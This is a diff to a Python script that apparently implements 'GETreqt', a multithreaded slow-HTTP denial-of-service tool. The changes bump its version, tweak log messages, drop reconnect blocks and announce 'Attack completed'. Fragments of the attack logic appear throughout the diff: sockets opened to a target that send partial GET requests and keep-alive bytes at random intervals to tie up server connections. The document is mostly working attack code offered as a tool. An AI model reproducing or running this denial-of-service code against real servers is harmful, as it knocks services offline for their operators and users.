@@ -3,10 +3,11 @@ import threading; import random
 import argparse; import requests
 from termcolor import colored
 import colorama; import re
+import tqdm
 
 colorama.init()
 
-currentVersionNumber = "v3.1.1"
+currentVersionNumber = "v3.2.0"
 VERSION_CHECK_URL = "https://raw.githubusercontent.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack/master/versionfile.txt"
 BANNER1 = colored('''
    ▄████ ▓█████▄▄▄█████▓ ██▀███  ▓█████   █████  ▄▄▄█████▓
@@ -94,7 +95,7 @@ def deployRequests(target, port, length, currentSocket, GETrequest):
             try:
                 sock.send(GETrequest)
                 successfulSends += 1
-                print(f"Successful send {successfulSends} from socket {currentSocket}\n", end="")
+                print(f"Successful send #{successfulSends} from socket {currentSocket}\n", end="")
             except:
                 try:
                     sock.shutdown(socket.SHUT_RDWR)
@@ -104,24 +105,13 @@ def deployRequests(target, port, length, currentSocket, GETrequest):
                     deployRequests(target, port, length, currentSocket, GETrequest)
             randomDelay = random.random() * 5
             time.sleep(randomDelay)
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
-        except:
-            try:
-                sock.shutdown(socket.SHUT_RDWR)
-                sock.close()
-            except:
-                pass
-        finally:
-                deployRequests(target, port, length, currentSocket, GETrequest)
 
     else:
         for i in range(1, length + 1):
             try:
                 # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
                 sock.send(b" ")
-                print(f"Sent \"don't you die on me\" packet {i} / {length} to socket {currentSocket}\n", end="")
+                print(f"Sent \"don't you die on me\" packet {i} / {length} via socket {currentSocket}\n", end="")
             except:
                 try:
                     sock.shutdown(socket.SHUT_RDWR)
@@ -131,17 +121,6 @@ def deployRequests(target, port, length, currentSocket, GETrequest):
                     deployRequests(target, port, length, currentSocket, GETrequest)
             randomDelay = random.random() * 5
             time.sleep(randomDelay)
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
-        except:
-            try:
-                sock.shutdown(socket.SHUT_RDWR)
-                sock.close()
-            except:
-                pass
-        finally:
-                deployRequests(target, port, length, currentSocket, GETrequest)
 
 
 def attackThreads(target, port, length, sockets, GETrequest):
@@ -153,7 +132,8 @@ def attackThreads(target, port, length, sockets, GETrequest):
         threadingPool[currentSocket].start()
     for thread in threadingPool:
         thread.join()
-    print("You may now exit this window.")
+    print("\nAttack completed. Press [Enter] to exit.")
+    input()
 
 
 if __name__ == "__main__":
